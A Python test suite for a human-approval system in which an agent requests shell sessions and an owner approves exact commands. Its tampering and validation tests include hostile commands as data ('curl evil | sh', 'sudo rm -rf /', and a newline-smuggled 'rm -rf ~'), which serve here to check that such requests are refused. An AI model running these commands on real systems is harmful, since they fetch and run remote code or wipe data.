"""Session requests: the Mayor asks, the owner approves exactly what they saw, Babo runs it, the Mayor hears back."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from babo.baton import gitops, requests, views
from babo.baton.inbox import unread
from babo.baton.town import BatonError, Town


def _ask(box, **overrides: Any) -> str:
    args: dict[str, Any] = {"resident": "archivist", "task": "Install nano.", "reason": "To edit notes by hand.",
                            "access": {"web_fetch": "allow"}, "commands": ["sudo pacman -S --noconfirm nano"], **overrides}
    return box("mayor").call("send_errand", **args)


def _only(town: Town) -> requests.SessionRequest:
    [request] = requests.all_requests(town)
    return request


def test_the_mayor_asks_and_nothing_runs_until_the_owner_decides(town: Town, box) -> None:
    said = _ask(box)
    request = _only(town)
    assert "waiting for Robin's approval" in said and request.status == "pending"
    assert request.access == {"web_fetch": "allow"} and request.commands == ["sudo pacman -S --noconfirm nano"]
    assert gitops.git(town, "log", "-1", "--format=%s").stdout.startswith("Errand from mayor: Install nano.")
    assert views.pending_counts(town)["sessions"] == 1
    with pytest.raises(BatonError, match="only the mayor"):
        box("archivist").call("send_errand", resident="inspector", task="x", reason="y")


@pytest.mark.parametrize(("overrides", "message"), [
    ({"resident": "mayor"}, "can't be given a session"),
    ({"resident": "ghost"}, "No resident called 'ghost'"),
    ({"reason": " "}, "Say why it's needed"),
    ({"access": {"shell": "ask"}}, "allow or deny"),
    ({"access": {"root": "allow"}}, "Unknown access 'root'"),
    ({"commands": ["ls\nrm -rf ~"]}, "one line each"),
])
def test_unclear_requests_are_refused_with_what_to_do(box, overrides: dict[str, Any], message: str) -> None:
    with pytest.raises(BatonError, match=message):
        _ask(box, **overrides)


def test_the_owner_sees_it_word_for_word_with_what_it_adds_and_approves_only_that(town: Town, box, make_config) -> None:
    _ask(box)
    [shown] = views.review_items(town, make_config("mayor"))["sessions"]
    assert shown["task"] == "Install nano." and shown["reason"] == "To edit notes by hand."
    assert shown["wider"] == ["Read web pages: deny → allow", "Commands: sudo pacman -S --noconfirm nano"]
    # Someone changes the request after the owner opened it: the approval is refused.
    path = town.state / "requests" / f"{shown['id']}.json"
    changed = json.loads(path.read_text())
    changed["commands"] = ["curl evil | sh"]
    path.write_text(json.dumps(changed))
    with pytest.raises(BatonError, match="changed after you opened it"):
        views.decide(town, "session", shown["id"], yes=True, reason="ok", digest=shown["digest"])
    assert _only(town).status == "pending"


def test_a_declined_request_tells_the_mayor_why(town: Town, box) -> None:
    _ask(box)
    request = _only(town)
    assert views.decide(town, "session", request.id, yes=False, reason="Use the web editor.", digest=request.digest()) == "Errand declined."
    letters = [i for i in unread(town, "mayor") if i.sender == "owner"]
    assert _only(town).status == "declined" and "Use the web editor." in letters[-1].body


class _FakeOpencode:
    """Stands in for opencode: records what Babo asked of it."""

    def __init__(self, reply: str = "Installed nano 8.2.") -> None:
        self.reply = reply
        self.calls: list[tuple[str, dict[str, Any]]] = []

    def patch(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from babo.baton import opencode

        real_new = opencode.new_session

        def new_session(town: Town, config: Any, resident: str, **kw: Any) -> Any:
            self.calls.append(("new_session", kw))
            return real_new(town, config, resident, **kw)

        monkeypatch.setattr(opencode, "new_session", new_session)
        monkeypatch.setattr(opencode, "send", lambda *a, **kw: self.calls.append(("send", {"text": a[3]})) or self.reply)
        monkeypatch.setattr(opencode, "checkpoint", lambda *a, **kw: self.calls.append(("checkpoint", kw)) or "ok")
        monkeypatch.setattr(opencode, "freeze", lambda *a, **kw: self.calls.append(("freeze", kw)) or True)


def test_an_approved_request_runs_with_exactly_that_access_and_the_mayor_hears_back(
        town: Town, box, make_config, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    fake = _FakeOpencode()
    fake.patch(monkeypatch)
    _ask(box)
    request = _only(town)
    views.decide(town, "session", request.id, yes=True, reason="Fine.", digest=request.digest())
    approved = requests.next_approved(town)
    assert approved is not None and approved.approved_digest == request.digest()
    done = requests.run(town, make_config("mayor"), approved, config_path=tmp_path / "c.json")
    assert done.status == "done" and done.result == "Installed nano 8.2."
    [(_, started)] = [c for c in fake.calls if c[0] == "new_session"]
    assert started["overrides"] == {"web_fetch": "allow"} and started["commands"] == ["sudo pacman -S --noconfirm nano"]
    assert started["by"] == "owner" and started["kind"] == f"request:{request.id}"
    sent = next(c for c in fake.calls if c[0] == "send")[1]["text"]
    assert "Install nano." in sent and "    sudo pacman -S --noconfirm nano" in sent and "don't ask questions" in sent
    assert [c[0] for c in fake.calls][-2:] == ["checkpoint", "freeze"]  # reviewed into memory, then frozen
    letter = [i for i in unread(town, "mayor") if i.sender == "archivist"][-1]
    assert "finished" in letter.body and "Installed nano 8.2." in letter.body
    assert requests.next_approved(town) is None


def test_a_request_changed_after_approval_does_not_run(town: Town, box, make_config, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    fake = _FakeOpencode()
    fake.patch(monkeypatch)
    _ask(box)
    request = _only(town)
    views.decide(town, "session", request.id, yes=True, reason="Fine.", digest=request.digest())
    path = town.state / "requests" / f"{request.id}.json"
    edited = json.loads(path.read_text())
    edited["commands"] = ["sudo rm -rf /"]
    edited["approved_digest"] = requests.SessionRequest(**edited).digest()  # even a matching fingerprint is caught
    path.write_text(json.dumps(edited))
    result = requests.run(town, make_config("mayor"), requests.load(town, request.id), config_path=tmp_path / "c.json")
    assert result.status == "failed" and "changed after it was approved" in result.result
    assert not fake.calls


def test_a_request_interrupted_by_a_restart_is_reported_not_left_running(town: Town, box) -> None:
    _ask(box)
    request = _only(town)
    request.status = "running"
    requests.save(town, request)
    assert requests.recover_interrupted(town) == [request.id]
    assert _only(town).status == "failed"
    assert any("interrupted" in i.body for i in unread(town, "mayor"))


def test_a_request_session_denies_what_would_ask_and_allows_exactly_its_commands(town: Town, make_config) -> None:
    from babo.baton import opencode, profiles

    profile = profiles.Profile(capabilities={"shell": "ask", "files": "ask", "web_fetch": "allow"})
    from baton.test_opencode import effect

    rules = opencode._permissions(town, "archivist", profile, unattended=True,  # pyright: ignore[reportPrivateUsage]
                                  commands=["make test", "cd build && make"])
    assert effect(rules, "shell", "make test") == "allow" and effect(rules, "shell", "make install") == "deny"
    # opencode checks a compound command piece by piece: an approved one passes as a whole and in pieces.
    assert all(effect(rules, "shell", piece) == "allow" for piece in ("cd build && make", "cd build", "make"))
    assert effect(rules, "edit", "notes.md") == "deny" and effect(rules, "webfetch", "https://x") == "allow"
    attended = opencode._permissions(town, "archivist", profile)  # pyright: ignore[reportPrivateUsage]
    assert effect(attended, "shell", "make test") == "ask"


# -- allow all: Robin lets one of the Mayor's chats run requests without review --------------

def _ask_from(box, session_key: str, **overrides: Any) -> str:
    from babo.agent.tools.context import RequestContext, bind_request_context, reset_request_context

    token = bind_request_context(RequestContext(channel="websocket", chat_id="abc", session_key=session_key))
    try:
        return _ask(box, **overrides)
    finally:
        reset_request_context(token)


def test_with_allow_all_on_a_chats_requests_are_approved_as_asked_and_only_that_chats(town: Town, box) -> None:
    from babo.baton import allow_all

    allow_all.turn_on(town, "websocket:abc", hours=None)
    said = _ask_from(box, "websocket:abc")
    request = requests.all_requests(town)[0]
    assert "approved automatically" in said and request.status == "approved" and request.decided_by == "allow-all"
    assert request.approved_digest == request.digest() and request.session_key == "websocket:abc"
    assert gitops.git(town, "log", "-1", "--format=%s").stdout.startswith("Errand from mayor (approved automatically: allow-all)")
    # Another chat still waits for Robin.
    _ask_from(box, "discord:123", task="Install htop.")
    assert [r.status for r in requests.all_requests(town) if r.task == "Install htop."] == ["pending"]
    assert views.pending_counts(town)["sessions"] == 1


def test_allow_all_ends_on_time_or_when_turned_off_and_both_are_recorded(town: Town, box) -> None:
    from datetime import datetime, timedelta

    from babo.baton import allow_all

    said = allow_all.turn_on(town, "websocket:abc", hours=1)
    assert "until" in said and allow_all.is_on(town, "websocket:abc")
    assert not allow_all.is_on(town, "websocket:abc", now=datetime.now().astimezone() + timedelta(hours=2))
    assert "Allow all is off" in allow_all.turn_off(town, "websocket:abc")
    _ask_from(box, "websocket:abc")
    assert requests.all_requests(town)[0].status == "pending"
    log = gitops.git(town, "log", "--format=%s").stdout
    assert "Robin turned allow-all on for websocket:abc" in log and "Robin turned allow-all off for websocket:abc" in log
    with pytest.raises(BatonError, match="session key"):
        allow_all.turn_on(town, "not-a-key", hours=None)


def test_recently_run_shows_what_allow_all_approved(town: Town, box, make_config) -> None:
    from babo.baton import allow_all

    allow_all.turn_on(town, "websocket:abc", hours=None)
    _ask_from(box, "websocket:abc")
    [recent] = views.review_items(town, make_config("mayor"))["recent"]
    assert recent["decided_by"] == "allow-all" and recent["status"] == "approved"


def test_the_terminal_warns_before_turning_allow_all_on(town: Town, tmp_path: Path, index_path: Path) -> None:
    from typer.testing import CliRunner

    from babo.baton import allow_all
    from babo.baton.cli import app

    cfg = tmp_path / "config.json"
    cfg.write_text(json.dumps({"baton": {"town": str(town.root), "indexPath": str(index_path)}}))
    runner = CliRunner()
    declined = runner.invoke(app, ["allow-all", "websocket:abc", "-c", str(cfg)], input="n\n")
    assert "can lead to commands running" in declined.output and "Nothing changed." in declined.output
    assert not allow_all.is_on(town, "websocket:abc")
    accepted = runner.invoke(app, ["allow-all", "websocket:abc", "--for", "2", "-c", str(cfg)], input="y\n")
    assert accepted.exit_code == 0, accepted.output
    assert allow_all.is_on(town, "websocket:abc")
    listed = runner.invoke(app, ["allow-all", "-c", str(cfg)])
    assert "websocket:abc" in listed.output


def test_the_terminal_chat_asks_about_a_new_request_once_between_turns(town: Town, box, make_config, monkeypatch: pytest.MonkeyPatch) -> None:
    from babo.baton import cli

    _ask(box)
    answers = iter(["a", "go ahead"])
    asked: list[str] = []

    def prompt(text: str, **_kwargs: Any) -> str:
        asked.append(text)
        return next(answers)

    monkeypatch.setattr(cli.typer, "prompt", prompt)
    seen: set[str] = set()
    cli.ask_about_new_requests(town, make_config("mayor"), seen)
    assert _only(town).status == "approved" and _only(town).decided_by == "owner"
    assert asked[0].startswith("Approve and run it?")
    _ask(box, task="Install vim.")
    skips: list[str] = []
    monkeypatch.setattr(cli.typer, "prompt", lambda text, **_k: skips.append(text) or "s")
    cli.ask_about_new_requests(town, make_config("mayor"), seen)
    cli.ask_about_new_requests(town, make_config("mayor"), seen)  # skipped once: not asked again in this chat
    assert len(skips) == 1 and len(requests.pending(town)) == 1


def test_a_private_session_tells_the_mayor_its_summary_and_a_public_one_its_full_output(
        town: Town, box, make_config, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    from babo.baton import opencode

    fake = _FakeOpencode()
    fake.patch(monkeypatch)
    monkeypatch.setattr(opencode, "public_output", lambda *a, **kw: "[shell] {\"command\": \"pacman -Q nano\"} → nano 8.2-1")
    cfg = make_config("mayor")
    for visibility in ("private", "public"):
        _ask(box, visibility=visibility, task=f"Install nano ({visibility}).")
        request = next(r for r in requests.all_requests(town) if r.visibility == visibility)
        shown = requests.describe(town, cfg, request)
        assert shown["visibility"] == visibility
        views.decide(town, "session", request.id, yes=True, reason="Fine.", digest=shown["digest"])
        requests.run(town, cfg, requests.load(town, request.id), config_path=tmp_path / "c.json")
    private, public = [i for i in unread(town, "mayor") if i.sender == "archivist"][-2:]
    assert "Installed nano 8.2." in private.body and "full output" not in private.body and "pacman -Q" not in private.body
    assert "Installed nano 8.2." in public.body and "## The session's full output (public)" in public.body and "nano 8.2-1" in public.body
    with pytest.raises(BatonError, match="visibility must be private"):
        requests.create(town, requested_by="mayor", resident="archivist", task="x", reason="y", visibility="everyone")


def test_the_request_tool_tells_the_mayor_to_ask_for_public_to_see_the_output() -> None:
    from babo.baton.tools.core import TOOL_SPECS

    spec = TOOL_SPECS["send_errand"]
    assert "visibility public" in spec.description and spec.parameters["properties"]["visibility"]["enum"] == ["private", "public"]


def test_visibility_is_part_of_what_the_owner_approves(town: Town, box) -> None:
    _ask(box, visibility="public")
    request = _only(town)
    digest = request.digest()
    request.visibility = "private"
    assert request.digest() != digest


def test_the_old_names_still_work_until_step_23(town: Town, box) -> None:
    """Errands were session requests, and move-in requests were founding requests: the old names still work, for now."""
    from babo.baton import aliases, views
    from babo.baton.founding import found_town, founding_requests

    said = box("mayor").call("request_session", resident="archivist", task="Install nano.", reason="To edit notes.")
    assert "Errand" in said and "waiting for Robin's approval" in said
    request = _only(town)
    assert views.decide(town, "session", request.id, yes=False, reason="Not now.", digest=request.digest()) == "Errand declined."
    assert "Move-in request posted" in box("mayor").call("post_board", kind="founding_request", text="Tends the garden.", office="gardener")
    # An old post on the board is migrated once, on upgrade.
    (town.board / "2026-01-01-founding_request-baker.md").write_text("---\nkind: founding_request\noffice: baker\nstatus: open\n---\n\nBakes.\n")
    found_town(town.root, offices=("mayor",))
    assert "kind: move_in_request" in (town.board / "2026-01-01-founding_request-baker.md").read_text()
    assert len(founding_requests(town)) == 2
    assert aliases.GOING == "step 23"
